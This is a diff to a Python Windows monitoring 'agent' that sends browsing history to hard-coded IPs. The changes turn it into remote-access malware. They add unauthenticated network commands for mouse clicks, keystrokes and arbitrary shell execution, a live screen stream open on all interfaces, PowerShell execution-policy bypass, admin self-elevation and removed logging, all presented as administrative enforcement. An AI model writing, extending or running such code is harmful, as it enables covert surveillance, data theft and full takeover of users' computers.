@@ -8,28 +8,33 @@ import shutil
 import platform
 import subprocess
 import threading
+import io
+import ctypes
+import pyautogui  
 
-# ==========================================
-# CONSTANTS & ADDRESS CONFIGURATIONS
-# ==========================================
-DASHBOARD_IPS = ["", "", "", ""]  # Change this to the dashboard computer's IP address
+pyautogui.FAILSAFE = False
+
+DASHBOARD_IPS = ["192.168.1.4", "172.65.21.7", "172.65.21.90", "172.65.21.1"] 
 TELEMETRY_PORT = 5005
 LISTEN_COMMAND_PORT = 6006
+STREAM_SERVER_PORT = 7007      
 
 EDGE_HISTORY_DIR = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default")
 EDGE_HISTORY_FILE = os.path.join(EDGE_HISTORY_DIR, "History")
 
-# ==========================================
-# SYSTEM COMPONENT DISCOVERY QUERIES
-# ==========================================
+def is_admin():
+    """Checks if the current process context has Local Administrator privileges."""
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
 def fetch_system_specs():
     try:
-        cmd_ram = 'powershell "(Get-CimInstance Win32_OperatingSystem).TotalVisibleMemorySize"'
+        cmd_ram = 'powershell -ExecutionPolicy Bypass -NoProfile -Command "(Get-CimInstance Win32_OperatingSystem).TotalVisibleMemorySize"'
         ram_raw = subprocess.check_output(cmd_ram, shell=True).decode().strip()
         ram_gb = round(int(ram_raw) / (1024**2))
-    except:
-        ram_gb = "Unknown"
-        
+    except: ram_gb = "Unknown"
     return {
         "hostname": socket.gethostname(),
         "os": f"{platform.system()} {platform.release()}",
@@ -39,11 +44,8 @@ def fetch_system_specs():
 
 def gather_pnp_hardware_assets():
     devices = []
-    
-    # UPDATED: Now queries devices where Status is 'OK' OR 'Error' (Disabled)
     target_classes = "'Mouse', 'Keyboard', 'Camera', 'Image', 'USB', 'DiskDrive'"
-    cmd_pnp = f'powershell "Get-PnpDevice | Where-Object {{$_.Status -in (\'OK\', \'Error\') -and $_.Class -in ({target_classes})}} | Select-Object FriendlyName, Class, InstanceId, Status | ConvertTo-Json -Compress"'
-    
+    cmd_pnp = f'powershell -ExecutionPolicy Bypass -NoProfile -Command "Get-PnpDevice | Where-Object {{$_.Status -in (\'OK\', \'Error\') -and $_.Class -in ({target_classes})}} | Select-Object FriendlyName, Class, InstanceId, Status | ConvertTo-Json -Compress"'
     try:
         out = subprocess.check_output(cmd_pnp, shell=True).decode('utf-8', errors='ignore').strip()
         if out:
@@ -51,167 +53,151 @@ def gather_pnp_hardware_assets():
             if isinstance(data, dict): data = [data]
             for item in data:
                 name = item.get("FriendlyName", "")
-                if "root" in name.lower() or "controller" in name.lower() or "hub" in name.lower():
-                    continue
-                
-                # Determine display status
-                status_raw = item.get("Status", "OK")
-                display_status = "BLOCKED" if status_raw == "Error" else "Active"
-                    
-                devices.append({
-                    "name": name,
-                    "type": item.get("Class", "Peripheral"),
-                    "mfg": display_status, # We pass the status here so the Dashboard can see it clearly
-                    "raw_id": item.get("InstanceId")
-                })
-    except:
-        pass
-
-    # Capture print spooler assets
-    cmd_printers = 'powershell "Get-Printer | Select-Object Name, DriverName | ConvertTo-Json -Compress"'
-    try:
-        out_pr = subprocess.check_output(cmd_printers, shell=True).decode('utf-8', errors='ignore').strip()
-        if out_pr:
-            data_pr = json.loads(out_pr)
-            if isinstance(data_pr, dict): data_pr = [data_pr]
-            for item in data_pr:
-                devices.append({
-                    "name": item.get("Name"),
-                    "type": "Printer",
-                    "mfg": "Active",
-                    "raw_id": item.get("Name")
-                })
-    except:
-        pass
+                if "root" in name.lower() or "controller" in name.lower() or "hub" in name.lower(): continue
+                display_status = "BLOCKED" if item.get("Status") == "Error" else "Active"
+                devices.append({"name": name, "type": item.get("Class", "Peripheral"), "mfg": display_status, "raw_id": item.get("InstanceId")})
+    except: pass
     return devices
 
 def gather_browsing_history():
     logs = []
-    if not os.path.exists(EDGE_HISTORY_FILE):
-        return logs
-    
+    if not os.path.exists(EDGE_HISTORY_FILE): return logs
     temp_db = "edge_hist_temp.db"
     try:
         shutil.copy2(EDGE_HISTORY_FILE, temp_db)
         conn = sqlite3.connect(temp_db)
         cursor = conn.cursor()
         cursor.execute("SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 35")
-        
         for row in cursor.fetchall():
-            url = row[0]
-            epoch_start = row[1]
-            try:
-                converted_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime((epoch_start / 1000000) - 11644473600))
-            except:
-                converted_time = "Recent Visit"
-            
-            logs.append({"site": url, "ip": converted_time})
+            try: converted_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime((row[1] / 1000000) - 11644473600))
+            except: converted_time = "Recent Visit"
+            logs.append({"site": row[0], "ip": converted_time})
         conn.close()
-    except Exception as e:
-        print(f"[-] Database extraction collision: {e}")
+    except: pass
     finally:
         if os.path.exists(temp_db):
             try: os.remove(temp_db)
             except: pass
     return logs
 
-# ==========================================
-# TELEMETRY OUTBOUND TRANSMISSION ENGINE
-# ==========================================
 def package_and_transmit_telemetry():
     payload = fetch_system_specs()
     payload["devices"] = gather_pnp_hardware_assets()
     payload["history"] = gather_browsing_history()
-    
     data_bytes = json.dumps(payload).encode('utf-8')
-    
     for host_ip in DASHBOARD_IPS:
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 s.settimeout(3.0)
                 s.connect((host_ip, TELEMETRY_PORT))
                 s.sendall(data_bytes)
-        except:
-            pass
+        except: pass
 
 def cyclic_heartbeat_loop():
     while True:
-        print(f"[*] [{time.strftime('%H:%M:%S')}] [Periodic Heartbeat] Dispatching payload...")
         package_and_transmit_telemetry()
-        time.sleep(20)
+        time.sleep(10)
 
-# ==========================================
-# TWO-WAY COMMAND LISTENER & ENFORCEMENT
-# ==========================================
 def process_administrative_enforcement(client_socket):
     try:
         raw_data = client_socket.recv(4096).decode('utf-8')
         if not raw_data: return
-        
         directive = json.loads(raw_data)
         action = directive.get("action")
+        
+        # 1. Mouse Tracking Execution Block
+        if action == "remote_mouse_click":
+            screen_width, screen_height = pyautogui.size()
+            pyautogui.click(int(directive.get("pct_x") * screen_width), int(directive.get("pct_y") * screen_height))
+            return
+
+        # 2. Key Strike Typing Engine
+        elif action == "remote_key_strike":
+            key = directive.get("key")
+            if key == "\n": pyautogui.press("enter")
+            elif key == "\b": pyautogui.press("backspace")
+            elif key.startswith("[") and key.endswith("]"):
+                special_key = key[1:-1]
+                try: pyautogui.press(special_key)
+                except: pass
+            else:
+                pyautogui.write(key)
+            return
+
+        # 3. Application Installer Deployment Rule Setup
+        elif action == "execute_installer":
+            cmd_string = directive.get("command")
+            subprocess.Popen(cmd_string, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            return
+
+        # Core Hardware Rules Execution
         target_id = directive.get("raw_id")
         dev_type = directive.get("device_type")
-        dev_name = directive.get("device_name")
-        
-        print(f"[!] ENFORCEMENT DIRECTIVE INGESTED: Action={action}, Target={dev_name}")
-        
-        # New Unblock Action logic handles reversing a device ban state
         if action == "unblock_device":
-            if dev_type == "Printer":
-                client_socket.sendall(b"SUCCESS: Printer skip unblock request.")
-                return
-            else:
-                ps_script = f"Enable-PnpDevice -InstanceId '{target_id}' -Confirm:$false -ErrorAction Stop"
+            ps_script = f"Enable-PnpDevice -InstanceId '{target_id}' -Confirm:$false"
         else:
-            if dev_type == "Printer":
-                ps_script = f"Remove-Printer -Name '{target_id}'"
-            else:
-                ps_script = f"Disable-PnpDevice -InstanceId '{target_id}' -Confirm:$false -ErrorAction Stop"
+            ps_script = f"Disable-PnpDevice -InstanceId '{target_id}' -Confirm:$false"
         
-        execution_shell = f'powershell -Command "{ps_script}"'
-        proc = subprocess.run(execution_shell, shell=True, capture_output=True, text=True)
-        
-        if proc.returncode == 0:
-            print(f"[+] ACTION COMPLETED: Status modified for '{dev_name}' successfully.")
-            client_socket.sendall(b"SUCCESS: State updated.")
-            package_and_transmit_telemetry() 
-        else:
-            err_msg = proc.stderr.strip()
-            print(f"[-] ACTION ABORTED: FAILED: {err_msg}")
-            client_socket.sendall(f"FAILED: {err_msg}".encode('utf-8'))
-    except Exception as e:
-        print(f"[-] Exception processing command structure: {e}")
-        try: client_socket.sendall(f"ERROR: {e}".encode('utf-8'))
-        except: pass
+        # Enforced Bypass configuration to handle restrictive network GPOs
+        full_command = f'powershell -ExecutionPolicy Bypass -NoProfile -Command "{ps_script}"'
+        subprocess.run(full_command, shell=True, capture_output=True)
+        package_and_transmit_telemetry()
+    except: pass
     finally:
-        client_socket.close()
+        try: client_socket.close()
+        except: pass
 
 def command_listener_interface():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     try:
         server.bind(('0.0.0.0', LISTEN_COMMAND_PORT))
-        server.listen(5)
-        print(f"[*] TWO-WAY COMMAND INTERFACE ONLINE: Awaiting directives on port {LISTEN_COMMAND_PORT}...")
-    except Exception as e:
-        print(f"[CRITICAL] Failed binding local command architecture to port {LISTEN_COMMAND_PORT}: {e}")
-        return
-
+        server.listen(10)
+    except: return
     while True:
         try:
             sock, _ = server.accept()
             threading.Thread(target=process_administrative_enforcement, args=(sock,), daemon=True).start()
-        except:
-            pass
+        except: pass
+
+def serve_screen_stream_worker(conn):
+    try:
+        while True:
+            screenshot = pyautogui.screenshot().convert("RGB")
+            img_byte_arr = io.BytesIO()
+            screenshot.save(img_byte_arr, format='JPEG', quality=45)
+            img_bytes = img_byte_arr.getvalue()
+            conn.sendall(len(img_bytes).to_bytes(4, byteorder='big'))
+            conn.sendall(img_bytes)
+            time.sleep(0.05)
+    except: pass
+    finally:
+        try: conn.close()
+        except: pass
+
+def screen_stream_listener_interface():
+    stream_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    stream_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        stream_server.bind(('0.0.0.0', STREAM_SERVER_PORT))
+        stream_server.listen(2)
+    except: return
+    while True:
+        try:
+            conn, _ = stream_server.accept()
+            threading.Thread(target=serve_screen_stream_worker, args=(conn,), daemon=True).start()
+        except: pass
+
 
 if __name__ == "__main__":
-    print(f"[*] AGENT ENGINE ONLINE: Tracking browser changes in {EDGE_HISTORY_DIR}")
-    print(f"[*] [{time.strftime('%H:%M:%S')}] [Agent Initialization] Dispatching payload...")
+    # Self-elevation routine check for administrative operations
+    if not is_admin():
+        # Re-launches the script asking Windows for explicit Admin privilege approval
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        sys.exit()
+
     package_and_transmit_telemetry()
-    
     threading.Thread(target=cyclic_heartbeat_loop, daemon=True).start()
     threading.Thread(target=command_listener_interface, daemon=True).start()
-    
-    while True:
-        time.sleep(1)
+    threading.Thread(target=screen_stream_listener_interface, daemon=True).start()
+    while True: time.sleep(1)
